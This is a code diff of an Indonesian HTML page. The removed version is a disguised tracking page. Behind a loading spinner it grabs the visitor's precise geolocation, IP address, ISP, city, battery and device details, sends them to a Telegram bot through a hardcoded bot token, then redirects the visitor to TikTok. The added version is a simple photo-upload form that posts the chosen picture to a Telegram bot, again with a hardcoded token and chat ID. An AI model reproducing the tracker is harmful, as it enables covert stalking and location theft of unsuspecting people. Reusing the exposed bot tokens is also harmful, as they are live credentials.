@@ -3,87 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memuat...</title>
+    <title>Kirim Foto ke Telegram</title>
     <style>
-        body { background: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        #status { margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+
+    <h2>Ambil Foto & Kirim ke Telegram Bot</h2>
+    
+    <!-- Input untuk buka galeri -->
+    <input type="file" accept="image/*" id="pilih-foto">
+    
+    <div id="status"></div>
 
     <script>
-        // --- KONFIGURASI ---
-        const token = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
-        
-        // Mengambil ID dari parameter URL (?id=xxxx)
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id');
+        // === GANTI BAGIAN INI ===
+        const TELEGRAM_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
+        const CHAT_ID = '1966317946';
+        // ========================
 
-        async function sendData(lat, lon) {
-            if (!chatId) {
-                // Jika tidak ada ID di link, langsung buang ke TikTok
-                window.location.href = "https://tiktok.com";
-                return;
-            }
+        document.getElementById('pilih-foto').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
 
-            // 1. Ambil Info IP & ISP
-            let ipDetail = "Gagal memuat IP";
-            try {
-                const res = await fetch('https://ipapi.co');
-                const data = await res.json();
-                ipDetail = `🌐 *IP:* ${data.ip}\n🏢 *ISP:* ${data.org}\n🏙️ *Lokasi:* ${data.city}, ${data.region}`;
-            } catch (e) {}
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "Sedang mengirim ke Telegram...";
+            statusDiv.style.color = "orange";
 
-            // 2. Ambil Info Baterai
-            let batDetail = "N/A";
-            try {
-                const bat = await navigator.getBattery();
-                batDetail = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Cas' : 'Tidak'})`;
-            } catch (e) {}
+            // Siapkan data untuk dikirim
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', 'Foto baru dikirim dari website GitHub Pages!');
 
-            const infoPonsel = `📱 *Platform:* ${navigator.platform}\n🔋 *Baterai:* ${batDetail}\n🖥️ *Layar:* ${screen.width}x${screen.height}`;
-
-            // 3. Susun Pesan
-            const text = encodeURIComponent(
-                `📍 *LOKASI TERDETEKSI*\n\n` +
-                `🔗 [Lihat di Google Maps](https://google.com{lat},${lon})\n\n` +
-                `${ipDetail}\n` +
-                `${infoPonsel}`
-            );
-
-            // 4. Kirim ke Telegram
-            const sendMsg = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=Markdown`;
-            const sendLoc = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
-
-            try {
-                await Promise.all([fetch(sendMsg), fetch(sendLoc)]);
-            } finally {
-                // Selesai, arahkan ke halaman tujuan
-                window.location.href = "https://tiktok.com";
-            }
-        }
-
-        window.onload = () => {
-            if (!chatId) {
-                window.location.href = "https://tiktok.com";
-                return;
-            }
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => sendData(p.coords.latitude, p.coords.longitude),
-                    (e) => {
-                        alert("Izin lokasi diperlukan untuk melanjutkan.");
-                        sendData("0", "0");
-                    },
-                    { enableHighAccuracy: true, timeout: 8000 }
-                );
-            } else {
-                sendData("0", "0");
-            }
-        };
+            // Kirim data ke API Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusDiv.innerText = "Foto berhasil dikirim ke Bot Telegram!";
+                    statusDiv.style.color = "green";
+                } else {
+                    statusDiv.innerText = "Gagal mengirim: " + data.description;
+                    statusDiv.style.color = "red";
+                }
+            })
+            .catch(error => {
+                statusDiv.innerText = "Terjadi kesalahan koneksi.";
+                statusDiv.style.color = "red";
+                console.error(error);
+            });
+        });
     </script>
+
 </body>
 </html>
